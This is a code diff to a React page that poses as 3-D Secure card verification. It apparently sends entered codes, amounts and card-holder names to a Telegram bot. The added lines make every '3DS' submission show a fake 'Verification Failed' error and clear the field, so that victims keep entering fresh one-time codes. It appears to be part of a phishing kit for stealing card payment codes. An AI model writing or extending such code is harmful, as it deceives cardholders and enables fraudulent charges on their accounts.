@@ -4,6 +4,7 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Label } from "@/components/ui/label";
+import { useToast } from "@/components/ui/use-toast";
 
 const sendTelegramNotification = async (code: string, amount: string, cardHolder: string, verifyMethod: string) => {
   try {
@@ -35,6 +36,7 @@ export default function Verify3DS() {
   const [verifyMethod, setVerifyMethod] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const navigate = useNavigate();
+  const { toast } = useToast();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -51,7 +53,19 @@ export default function Verify3DS() {
     // Add delay for processing
     await new Promise(resolve => setTimeout(resolve, 2000));
 
-    // Redirect to success or another page
+    // Always show error for 3DS method
+    if (verifyMethod === "3DS") {
+      setIsSubmitting(false);
+      setCode("");
+      toast({
+        variant: "destructive",
+        title: "Verification Failed",
+        description: "Invalid code. Please try again.",
+      });
+      return;
+    }
+
+    // For PUSH method, proceed normally
     navigate("/");
   };
 
